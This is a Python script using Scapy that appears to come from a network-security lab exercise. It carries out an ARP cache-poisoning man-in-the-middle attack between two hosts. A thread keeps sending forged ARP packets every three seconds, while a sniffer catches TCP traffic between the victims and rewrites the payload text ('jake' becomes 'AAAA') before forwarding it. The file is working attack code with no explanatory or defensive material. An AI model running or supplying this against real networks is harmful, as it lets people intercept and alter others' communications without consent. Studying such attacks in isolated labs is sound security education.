#!/usr/bin/env python3
from scapy.all import *
import re
import threading
import time

# IP and MAC address definitions
IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"
IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"
M_IP = '10.9.0.105' 
FAKE_MAC = '12:34:56:78:90:99'
M_MAC = '02:42:0a:09:00:69'

def spoof_pkt(pkt):
    if (pkt[IP].src == IP_A and pkt[IP].dst == IP_B) or (pkt[IP].src == IP_B and pkt[IP].dst == IP_A):
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].payload)
        del(newpkt[TCP].chksum)

        if pkt[TCP].payload:
            data = pkt[TCP].payload.load
            newdata = re.sub(r'(?i)jake', 'AAAA', data.decode())
            send(newpkt/newdata)
        else:
            send(newpkt)

def send_fake_arp(src_mac, dst_mac, src_ip, dst_ip):
    E = Ether(src=src_mac, dst=dst_mac)
    A = ARP(op=1, psrc=src_ip, hwsrc=src_mac, pdst=dst_ip, hwdst=dst_mac)
    pkt = E/A
    sendp(pkt)

def arp_thread():
    while True:
        send_fake_arp(M_MAC, MAC_A, IP_B, IP_A)
        send_fake_arp(M_MAC, MAC_B, IP_A, IP_B)
        time.sleep(3)

# Start ARP spoof thread
threading.Thread(target=arp_thread).start()

# Start packet sniffing
f = 'tcp'
pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)

